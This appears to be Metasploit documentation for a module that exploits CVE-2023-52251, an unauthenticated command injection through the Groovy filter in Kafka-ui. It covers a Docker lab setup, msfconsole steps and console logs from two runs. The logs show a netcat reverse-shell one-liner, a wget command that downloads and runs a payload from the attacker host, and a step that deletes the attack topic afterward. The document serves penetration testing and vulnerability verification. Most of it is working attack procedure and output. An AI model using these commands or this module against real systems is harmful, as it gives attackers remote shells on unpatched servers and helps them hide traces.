## Vulnerable Application
A command injection vulnerability exists in Kafka-ui between `v0.4.0` and `v0.7.1` allowing an attacker to inject
and execute arbitrary shell commands via the `groovy` filter parameter at the `topic` section.

This module has been tested with Kali Linux 2023.11 on the following targets:
* Kafka-ui v0.4.0 running on MacOS Docker Desktop
* Kafka-ui v0.7.0 running on MacOS Docker Desktop
* Kafka-ui v0.7.1 running on MacOS Docker Desktop

## Installation
### Installation steps to install Kafka-ui
* Install `Docker` on your preferred platform.
*  Here are the installation instructions for [Docker Desktop on MacOS](https://docs.docker.com/desktop/install/mac-install/).
* Create a empty directory (`kafka-ui`).
* Create the following `docker-compose.yaml` file in the directory. This will automatically create a Kafka cluster with Kafka-ui.
* You can modify the `v0.7.0` in the `yaml` file to pull different versions.
```yaml
version: '2'

networks:
  rmoff_kafka:
    name: rmoff_kafka

services:
  zookeeper:
    image: confluentinc/cp-zookeeper:latest
    container_name: zookeeper
    networks:
      - rmoff_kafka
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_TICK_TIME: 2000
    ports:
      - 22181:2181

  kafka:
    image: confluentinc/cp-kafka:latest
    container_name: kafka
    networks:
      - rmoff_kafka
    depends_on:
      - zookeeper
    ports:
      - 29092:9092
    environment:
      KAFKA_BROKER_ID: 1
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092,PLAINTEXT_HOST://localhost:29092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1

  kafka-ui:
    container_name: kafka-ui
    image: provectuslabs/kafka-ui:v0.7.0
    networks:
      - rmoff_kafka
    ports:
      - 8080:8080
    depends_on:
      - kafka
      - zookeeper
    environment:
      KAFKA_CLUSTERS_0_NAME: local
      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: kafka:9092
      KAFKA_CLUSTERS_0_ZOOKEEPER: zookeeper:2181
      KAFKA_BROKERCONNECT: kafka:9092
      DYNAMIC_CONFIG_ENABLED: 'true'
      KAFKA_CLUSTERS_0_METRICS_PORT: 9997
```

* Run following command `docker-compose up -d` to install and run the Kafka ui and cluster environment.
* Your Kafka ui should be accessible on `http://localhost:8080` with an active Kafka cluster running.
* You can bring down the environment for a fresh start with the command `docker-compose down --volumes`.

You are now ready to test the module.

## Verification Steps
- [x] Start `msfconsole`
- [x] `use exploit/linux/http/kafka_ui_unauth_rce_cve_2023_52251`
- [x] `set rhosts <ip-target>`
- [x] `set lhost <ip-attacker>`
- [x] `set target <0=Unix/Linux Command>`
- [x] `exploit`

you should get a `shell` or `Meterpreter`.

```shell
msf6 exploit(linux/http/kafka_ui_unauth_rce_cve_2023_52251) > info

       Name: Kafka UI Unauthenticated Remote Command Execution via the Groovy Filter option.
     Module: exploit/linux/http/kafka_ui_unauth_rce_cve_2023_52251
   Platform: Unix, Linux
       Arch: cmd, x64, x86
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2023-09-27

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  BobTheShopLifter and Thingstad

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix/Linux Command

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT    8080             yes       The target port (TCP)
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)
  VHOST                     no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
                                      or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  A command injection vulnerability exists in Kafka ui between `v0.4.0` and `v0.7.1` allowing
  an attacker to inject and execute arbitrary shell commands via the `groovy` filter parameter
  at the `topic` section.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2023-52251
  https://attackerkb.com/topics/ATJ1hTVB8H/cve-2023-52251
  https://github.com/BobTheShoplifter/CVE-2023-52251-POC


View the full module info with the info -d command.
```

## Options
No specific options for this module.

## Scenarios
### Kafka-ui v0.7.0 Unix/Linux Command - cmd/unix/reverse_netcat
```shell
msf6 exploit(linux/http/kafka_ui_unauth_rce_cve_2023_52251) > set verbose true
verbose => true
msf6 exploit(linux/http/kafka_ui_unauth_rce_cve_2023_52251) > exploit

[+] mkfifo /tmp/cpzbj; nc 192.168.201.8 4444 0</tmp/cpzbj | /bin/sh >/tmp/cpzbj 2>&1; rm /tmp/cpzbj
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.25:8080 can be exploited.
[+] The target is vulnerable. Kafka-ui version: 0.7.0
[*] Executing Unix/Linux Command for cmd/unix/reverse_netcat
[*] Searching for active Kafka cluster...
[+] Active Kafka cluster found: local
[*] Creating a new topic...
[+] New topic created: 9nQbg
[*] Trigger Groovy script payload execution by creating a message...
[*] Removing tracks...
[+] Successfully deleted topic 9nQbg.
[*] Command shell session 28 opened (192.168.201.8:4444 -> 192.168.201.25:49429) at 2024-01-20 18:44:52 +0000

uname -a
Linux 889a0c5cec88 6.4.16-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Nov 16 10:55:59 UTC 2023 x86_64 Linux
id
uid=100(kafkaui) gid=101(kafkaui) groups=101(kafkaui)
```
### Kafka-ui v0.7.0 Unix/Linux Command - cmd/linux/http/x64/meterpreter_reverse_tcp
```shell
msf6 exploit(linux/http/kafka_ui_unauth_rce_cve_2023_52251) > exploit

[*] Command to run on remote host: wget -qO /tmp/LfMsMsUxX http://192.168.201.8:1981/Qw3rZo-yo18aYrvy_AQU-w; chmod +x /tmp/LfMsMsUxX; /tmp/LfMsMsUxX &
[*] Fetch Handler listening on 192.168.201.8:1981
[*] HTTP server started
[*] Adding resource /Qw3rZo-yo18aYrvy_AQU-w
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.25:8080 can be exploited.
[+] The target appears to be vulnerable. Kafka-ui version: 0.7.0
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter_reverse_tcp
[*] Searching for active Kafka cluster...
[+] Active Kafka cluster found: local
[*] Creating a new topic...
[+] New topic created: D9kH687
[*] Trigger Groovy script payload execution by creating a message...
[*] Removing tracks...
[*] Client 192.168.201.25 requested /Qw3rZo-yo18aYrvy_AQU-w
[*] Sending payload to 192.168.201.25 (Wget)
[+] Successfully deleted topic D9kH687.
[*] Meterpreter session 29 opened (192.168.201.8:4444 -> 192.168.201.25:50355) at 2024-01-23 08:47:41 +0000

meterpreter > sysinfo
Computer     : 172.30.0.4
OS           :  (Linux 6.4.16-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: kafkaui
meterpreter >
```

## Limitations
No limitations.
